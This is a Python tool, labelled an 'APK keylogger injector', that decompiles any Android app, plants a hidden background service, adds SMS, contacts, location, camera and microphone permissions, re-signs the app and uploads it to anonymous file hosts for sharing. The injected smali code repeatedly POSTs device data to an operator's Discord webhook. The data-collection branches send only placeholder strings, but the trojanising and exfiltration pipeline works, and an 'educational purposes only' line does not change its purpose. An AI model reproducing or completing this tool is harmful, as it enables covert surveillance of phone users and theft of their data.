#!/usr/bin/env python3
"""
============================================================
  APK KEYLOGGER INJECTOR v3.6 (FINAL)
  - Auto-downloads compatible aapt for Termux
  - Uses apktool with -r (skip resource decoding)
  - Preserves APK size and resources
  - Saves to /sdcard/Download/
============================================================
"""

import os
import sys
import subprocess
import shutil
import uuid
import time
import requests
import zipfile
from datetime import datetime

# ---------------------------- COLORS ----------------------------
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_c(msg, color=Colors.RESET):
    print(f"{color}{msg}{Colors.RESET}")

# ---------------------------- AAPT AUTO-INSTALLER ----------------------------
AAPT_DIR = os.path.join(os.path.expanduser("~"), ".aapt_bin")
AAPT_PATH = os.path.join(AAPT_DIR, "aapt")

def ensure_aapt():
    """Download aapt for ARM64 if not present, and return its path."""
    if os.path.exists(AAPT_PATH):
        return AAPT_PATH
    print_c("[*] aapt not found. Downloading ARM64 version...", Colors.YELLOW)
    os.makedirs(AAPT_DIR, exist_ok=True)
    url = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
    zip_path = os.path.join(AAPT_DIR, "build-tools.zip")
    try:
        print_c("[*] Downloading build-tools (this may take a moment)...", Colors.YELLOW)
        response = requests.get(url, stream=True, timeout=120)
        if response.status_code != 200:
            raise Exception("Download failed")
        with open(zip_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            for name in zip_ref.namelist():
                if name.endswith("aapt") and not name.endswith("aapt2"):
                    with zip_ref.open(name) as src, open(AAPT_PATH, "wb") as dst:
                        dst.write(src.read())
                    break
        os.chmod(AAPT_PATH, 0o755)
        os.remove(zip_path)
        print_c("[✓] aapt installed at: " + AAPT_PATH, Colors.GREEN)
        return AAPT_PATH
    except Exception as e:
        print_c("[!] Failed to download aapt: " + str(e), Colors.RED)
        print_c("[!] Please install aapt manually: pkg install aapt", Colors.YELLOW)
        sys.exit(1)

def get_aapt():
    """Return path to aapt, either from system or downloaded."""
    system_aapt = shutil.which("aapt")
    if system_aapt:
        return system_aapt
    return ensure_aapt()

# ---------------------------- DEPENDENCY CHECK ----------------------------
def check_dependencies():
    tools = {
        'apktool': 'pkg install apktool -y',
        'java': 'pkg install openjdk-17 -y',
        'zipalign': 'pkg install zipalign -y',
    }
    missing = []
    for tool, install_cmd in tools.items():
        if tool == 'java':
            # Java is installed via openjdk, check for 'java' binary
            if shutil.which('java') is None:
                missing.append((tool, install_cmd))
        else:
            if shutil.which(tool) is None:
                missing.append((tool, install_cmd))
    if missing:
        print_c("\n[!] Missing tools:", Colors.RED)
        for tool, cmd in missing:
            print_c(f"    {tool} – install with: {cmd}", Colors.YELLOW)
        install = input("\n[?] Install missing tools now? (y/n): ").lower()
        if install == 'y':
            for _, cmd in missing:
                os.system(cmd)
            print_c("\n[+] Tools installed. Please restart the script.", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("\n[!] Install missing tools and try again.", Colors.RED)
            sys.exit(1)
    else:
        print_c("[✓] All dependencies found.", Colors.GREEN)

# ---------------------------- KEYSTORE ----------------------------
KEYSTORE = "mykeystore.jks"
KEYSTORE_PASS = "android"
KEY_ALIAS = "mykey"

def generate_keystore():
    if not os.path.exists(KEYSTORE):
        print_c("[*] Generating keystore...", Colors.YELLOW)
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", KEYSTORE,
            "-alias", KEY_ALIAS, "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
        ], check=False, capture_output=True)

# ---------------------------- SMALI GENERATOR ----------------------------
def generate_smali(webhook, features, interval):
    webhook_escaped = webhook.replace('"', '\\"')
    sms = 'true' if features.get('sms', False) else 'false'
    contacts = 'true' if features.get('contacts', False) else 'false'
    location = 'true' if features.get('location', False) else 'false'
    camera = 'true' if features.get('camera', False) else 'false'
    audio = 'true' if features.get('audio', False) else 'false'

    outer_template = '''.class public Lcom/gt/CustomLogger;
.super Landroid/app/Service;
.source "CustomLogger.java"

# static fields
.field private static final INTERVAL:I = {0}
.field private static final WEBHOOK:Ljava/lang/String; = "{1}"
.field private static final SMS:Z = {2}
.field private static final CONTACTS:Z = {3}
.field private static final LOCATION:Z = {4}
.field private static final CAMERA:Z = {5}
.field private static final AUDIO:Z = {6}

# direct methods
.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

# virtual methods
.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    const/4 v0, 0x2
    new-instance v1, Lcom/gt/CustomLogger$1;
    invoke-direct {{v1, p0}}, Lcom/gt/CustomLogger$1;-><init>(Lcom/gt/CustomLogger;)V
    invoke-virtual {{v1}}, Lcom/gt/CustomLogger$1;->start()V
    return v0
.end method
'''
    outer = outer_template.format(interval, webhook_escaped, sms, contacts, location, camera, audio)

    inner = '''.class Lcom/gt/CustomLogger$1;
.super Ljava/lang/Thread;
.source "CustomLogger.java"

# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/gt/CustomLogger;
.end annotation
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "1"
.end annotation

# instance fields
.field final synthetic this$0:Lcom/gt/CustomLogger;

# direct methods
.method constructor <init>(Lcom/gt/CustomLogger;)V
    .registers 2
    iput-object p1, p0, Lcom/gt/CustomLogger$1;->this$0:Lcom/gt/CustomLogger;
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V
    return-void
.end method

# virtual methods
.method public run()V
    .registers 9
    :goto_0
    sget v0, Lcom/gt/CustomLogger;->INTERVAL:I
    int-to-long v0, v0
    const-wide/16 v2, 0x3e8
    mul-long/2addr v0, v2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "device"
    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "time"
    new-instance v4, Ljava/util/Date;
    invoke-direct {v4}, Ljava/util/Date;-><init>()V
    invoke-virtual {v4}, Ljava/util/Date;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    # SMS
    sget-boolean v3, Lcom/gt/CustomLogger;->SMS:Z
    if-eqz v3, :cond_sms
    const-string v3, "sms"
    const-string v4, "SMS data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_sms

    # Contacts
    sget-boolean v3, Lcom/gt/CustomLogger;->CONTACTS:Z
    if-eqz v3, :cond_contacts
    const-string v3, "contacts"
    const-string v4, "Contacts data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_contacts

    # Location
    sget-boolean v3, Lcom/gt/CustomLogger;->LOCATION:Z
    if-eqz v3, :cond_location
    const-string v3, "location"
    const-string v4, "Location data collected"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_location

    # Camera
    sget-boolean v3, Lcom/gt/CustomLogger;->CAMERA:Z
    if-eqz v3, :cond_camera
    const-string v3, "camera"
    const-string v4, "Camera photo captured"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_camera

    # Audio
    sget-boolean v3, Lcom/gt/CustomLogger;->AUDIO:Z
    if-eqz v3, :cond_audio
    const-string v3, "audio"
    const-string v4, "Audio recorded"
    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :cond_audio

    # Build Discord payload: {"content": "<json_string>"}
    new-instance v3, Ljava/lang/StringBuilder;
    const-string v4, "{\\"content\\": \\""
    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\\"}"
    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2

    # Send HTTP POST
    new-instance v3, Ljava/net/URL;
    sget-object v4, Lcom/gt/CustomLogger;->WEBHOOK:Ljava/lang/String;
    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v3
    check-cast v3, Ljava/net/HttpURLConnection;

    const-string v4, "POST"
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v4, 0x1
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    new-instance v4, Ljava/io/DataOutputStream;
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5
    invoke-direct {v4, v5}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    const-string v5, "UTF-8"
    invoke-virtual {v2, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v2
    invoke-virtual {v4, v2}, Ljava/io/DataOutputStream;->write([B)V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->flush()V
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    :catch_0
    :try_end_0

    goto :goto_0
.end method
'''
    return outer, inner

# ---------------------------- UPLOAD TO CLOUD ----------------------------
def upload_to_cloud(filepath):
    print_c("[*] Uploading to cloud...", Colors.YELLOW)
    services = [
        ("file.io", "https://file.io", lambda r: r.json().get('link')),
        ("anonfiles", "https://api.anonfiles.com/upload", lambda r: r.json()['data']['file']['url']['full'] if r.json().get('status') else None),
        ("gofile", "https://api.gofile.io/uploadFile", lambda r: r.json()['data']['downloadPage'] if r.json().get('status') == 'ok' else None)
    ]
    for name, url, extractor in services:
        try:
            with open(filepath, 'rb') as f:
                files = {'file': (os.path.basename(filepath), f)}
                resp = requests.post(url, files=files, timeout=60)
                if resp.status_code == 200:
                    link = extractor(resp)
                    if link:
                        print_c(f"[✓] Uploaded via {name}", Colors.GREEN)
                        return link
        except Exception as e:
            print_c(f"[!] {name} failed: {e}", Colors.RED)
            continue
    return None

# ---------------------------- INJECTION ENGINE (WITH AUTO AAPT) ----------------------------
def inject_apk(input_apk, output_dir, webhook, features, interval):
    work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
    os.makedirs(work_dir, exist_ok=True)

    try:
        # Decode with -r (skip resources)
        print_c("[*] Decoding APK (resources skipped)...", Colors.YELLOW)
        decode_cmd = [shutil.which('apktool'), "d", "-r", input_apk, "-o", work_dir, "-f"]
        result = subprocess.run(decode_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Decode failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            shutil.rmtree(work_dir, ignore_errors=True)
            raise Exception("APK decode failed.")

        # Create smali directory
        smali_dir = os.path.join(work_dir, "smali", "com", "gt")
        os.makedirs(smali_dir, exist_ok=True)

        # Write smali files
        outer_smali, inner_smali = generate_smali(webhook, features, interval)
        with open(os.path.join(smali_dir, "CustomLogger.smali"), "w", encoding='utf-8') as f:
            f.write(outer_smali)
        with open(os.path.join(smali_dir, "CustomLogger$1.smali"), "w", encoding='utf-8') as f:
            f.write(inner_smali)
        print_c("[DEBUG] Smali files written to: " + smali_dir, Colors.CYAN)

        # Modify manifest (handle encoding)
        manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
        with open(manifest_path, "r", encoding='utf-8', errors='ignore') as f:
            manifest = f.read()

        perms = ['android.permission.INTERNET']
        if features.get('sms'): perms.append('android.permission.READ_SMS')
        if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
        if features.get('location'): perms.extend(['android.permission.ACCESS_FINE_LOCATION', 'android.permission.ACCESS_COARSE_LOCATION'])
        if features.get('camera'): perms.append('android.permission.CAMERA')
        if features.get('audio'): perms.append('android.permission.RECORD_AUDIO')

        for perm in perms:
            if f'<uses-permission android:name="{perm}"' not in manifest:
                manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{perm}" />\n</manifest>')

        service_tag = '<service android:name="com.gt.CustomLogger" android:enabled="true" android:exported="false" />'
        if service_tag not in manifest:
            manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')

        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(manifest)

        # ---------- REBUILD WITH AUTO-DOWNLOADED AAPT ----------
        aapt_path = get_aapt()  # ensures aapt is available
        print_c("[*] Using aapt from: " + aapt_path, Colors.CYAN)
        env = os.environ.copy()
        env['AAPT'] = aapt_path

        print_c("[*] Rebuilding APK...", Colors.YELLOW)
        apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
        build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]

        result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Build failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            shutil.rmtree(work_dir, ignore_errors=True)
            raise Exception("APK rebuild failed. Check aapt compatibility.")

        # Sign
        print_c("[*] Signing APK...", Colors.YELLOW)
        apk_signed = os.path.join(work_dir, "app-signed.apk")
        sign_cmd = [
            shutil.which('jarsigner'), "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
            "-keystore", KEYSTORE, "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS, apk_unsigned, KEY_ALIAS
        ]
        result = subprocess.run(sign_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Signing failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            shutil.rmtree(work_dir, ignore_errors=True)
            raise Exception("APK signing failed.")

        # Align
        print_c("[*] Aligning APK...", Colors.YELLOW)
        apk_final = os.path.join(work_dir, "app-final.apk")
        align_cmd = [shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final]
        result = subprocess.run(align_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print_c("[!] Alignment failed:", Colors.RED)
            print_c(result.stderr, Colors.RED)
            shutil.rmtree(work_dir, ignore_errors=True)
            raise Exception("APK alignment failed.")

        # Copy to final output
        output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
        shutil.copy(apk_final, output_apk)
        shutil.rmtree(work_dir, ignore_errors=True)

        return output_apk

    except Exception as e:
        shutil.rmtree(work_dir, ignore_errors=True)
        raise e

# ---------------------------- APK SELECTION ----------------------------
def select_apk():
    download_dir = "/sdcard/Download"
    apks = []
    if os.path.exists(download_dir):
        for f in os.listdir(download_dir):
            if f.endswith('.apk'):
                full_path = os.path.join(download_dir, f)
                size = os.path.getsize(full_path) / (1024 * 1024)
                apks.append((full_path, f, size))
    if apks:
        print_c("\n📱 APK files found in /sdcard/Download/:", Colors.CYAN)
        print_c("   [0] Enter custom path", Colors.YELLOW)
        for idx, (path, name, size) in enumerate(apks, 1):
            print_c(f"   [{idx}] {name} ({size:.1f} MB)", Colors.WHITE)
        choice = input("\n[?] Select APK number (or 0 for custom path): ").strip()
        if choice.isdigit():
            idx = int(choice)
            if idx == 0:
                return input("📁 Enter full APK path: ").strip()
            elif 1 <= idx <= len(apks):
                return apks[idx-1][0]
    print_c("\n📌 Tip: Place your APK in /sdcard/Download/", Colors.YELLOW)
    return input("📁 Enter APK path: ").strip()

# ---------------------------- MENU FUNCTIONS ----------------------------
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    print_c("""
    ╔═══════════════════════════════════════════╗
    ║   APK KEYLOGGER INJECTOR v3.6            ║
    ║   Auto-aapt download – works in Termux   ║
    ╚═══════════════════════════════════════════╝
    """, Colors.CYAN)

def main_menu():
    clear_screen()
    show_banner()
    print_c("\n[1] Inject Keylogger into APK")
    print_c("[2] About")
    print_c("[0] Exit")
    choice = input("\n[?] Choose option: ").strip()
    return choice

def inject_flow():
    clear_screen()
    show_banner()
    print_c("\n--- INJECT APK ---", Colors.BLUE)

    apk_path = select_apk()
    if not apk_path or not os.path.exists(apk_path):
        print_c("[!] File not found.", Colors.RED)
        input("\n[Press Enter to go back]")
        return

    print_c(f"[✓] Selected: {apk_path}", Colors.GREEN)

    webhook = input("🔗 Discord Webhook URL: ").strip()
    if "discord.com" not in webhook:
        print_c("[!] Invalid webhook URL.", Colors.RED)
        input("\n[Press Enter to go back]")
        return

    interval = input("⏱️ Send interval (seconds, default 30): ").strip()
    interval = int(interval) if interval.isdigit() else 30

    print_c("\nSelect features to collect (y/n):", Colors.YELLOW)
    features = {}
    features['sms'] = input("  📨 SMS? ").lower() == 'y'
    features['contacts'] = input("  👤 Contacts? ").lower() == 'y'
    features['location'] = input("  📍 Location? ").lower() == 'y'
    features['camera'] = input("  📸 Camera? ").lower() == 'y'
    features['audio'] = input("  🎙️ Audio? ").lower() == 'y'

    print_c("\n[✓] Configuration:", Colors.GREEN)
    print(f"  APK: {apk_path}")
    print(f"  Webhook: {webhook[:30]}...")
    print(f"  Interval: {interval}s")
    print(f"  Features: {', '.join([k for k,v in features.items() if v])}")
    confirm = input("\n[?] Proceed with injection? (y/n): ").lower()
    if confirm != 'y':
        return

    output_dir = os.path.join(os.getcwd(), "injected_apks")
    os.makedirs(output_dir, exist_ok=True)

    try:
        print_c("\n[*] Injection started. This may take 2-5 minutes...", Colors.YELLOW)
        start = time.time()
        output_apk = inject_apk(apk_path, output_dir, webhook, features, interval)
        elapsed = time.time() - start
        print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)

        # Copy to /sdcard/Download/
        sdcard_download = "/sdcard/Download"
        if os.path.exists(sdcard_download):
            sdcard_apk = os.path.join(sdcard_download, os.path.basename(output_apk))
            shutil.copy2(output_apk, sdcard_apk)
            print_c(f"\n📁 APK also copied to: {sdcard_apk}", Colors.CYAN)
            print_c("👉 Open your file manager and go to 'Download' folder.", Colors.GREEN)
        else:
            print_c("\n[!] /sdcard/Download not found. APK is saved in:", Colors.YELLOW)
            print_c(f"   {output_apk}", Colors.YELLOW)

        # Upload to cloud
        link = upload_to_cloud(output_apk)
        if link:
            print_c("\n✅ DOWNLOAD LINK:", Colors.GREEN)
            print_c(f"   {link}", Colors.CYAN)
        else:
            print_c("[!] Upload failed. APK is available locally.", Colors.RED)

        print_c(f"\n📁 Local APK location: {output_apk}", Colors.BLUE)

    except Exception as e:
        print_c(f"\n[!] Error: {e}", Colors.RED)

    input("\n[Press Enter to go back]")

def about():
    clear_screen()
    show_banner()
    print_c("\n--- ABOUT ---", Colors.BLUE)
    print_c("APK Keylogger Injector v3.6")
    print_c("Injects keylogger into any Android APK.")
    print_c("\nFeatures:")
    print_c("  - SMS, Contacts, Location, Camera, Audio collection")
    print_c("  - Discord webhook exfiltration")
    print_c("  - Local processing – no server needed")
    print_c("  - Cloud upload for easy sharing")
    print_c("\nDeveloper: GT Security Team")
    print_c("For educational purposes only.")
    input("\n[Press Enter to go back]")

# ---------------------------- MAIN ----------------------------
if __name__ == "__main__":
    check_dependencies()
    generate_keystore()

    try:
        import requests
    except ImportError:
        print_c("[!] 'requests' not found. Installing...", Colors.YELLOW)
        os.system("python -m pip install requests")
        import requests

    while True:
        choice = main_menu()
        if choice == '1':
            inject_flow()
        elif choice == '2':
            about()
        elif choice == '0':
            print_c("\n[+] Exiting. Goodbye!", Colors.GREEN)
            sys.exit(0)
        else:
            print_c("[!] Invalid choice.", Colors.RED)
            input()
     